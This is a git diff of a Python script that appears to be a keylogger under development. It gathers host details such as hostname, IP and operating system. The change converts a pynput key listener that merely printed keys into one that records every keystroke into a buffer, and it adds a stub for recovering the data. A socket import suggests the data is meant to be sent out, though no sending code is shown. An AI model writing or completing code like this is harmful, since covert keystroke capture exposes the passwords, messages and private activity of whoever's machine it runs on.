@@ -1,7 +1,8 @@
 #!/usr/bin/python3
+data = ''
 try:
     import subprocess
-    from pynput.keyboard import Listener
+    from pynput import keyboard
     import socket
     import platform
 
@@ -20,14 +21,26 @@ finally:
     USER_SYSTEM = platform.system()
     USER_MACHINE = platform.machine()
     USER_DATA = USER_HOSTNAME + "\n" + USER_IP + "\n" + USER_PROCESSOR + "\n" + USER_SYSTEM + "\n" + USER_MACHINE
-    data = ''
+    
+    def recover_data(data):
+        print("recover")
         
         
     def on_press(key):
-        print(key)
+        global data
+        if key == keyboard.Key.space:
+            data += " "
+        elif key == keyboard.Key.enter:
+            data += "\n"
+        elif key == keyboard.Key.tab:
+            data += "\t"
+        else:
+            data += str(key).strip("'")
+            print(data)
+        
         
 
-    with Listener(on_press=on_press) as listener: 
+    with keyboard.Listener(on_press=on_press) as listener: 
         listener.join()  
 
 
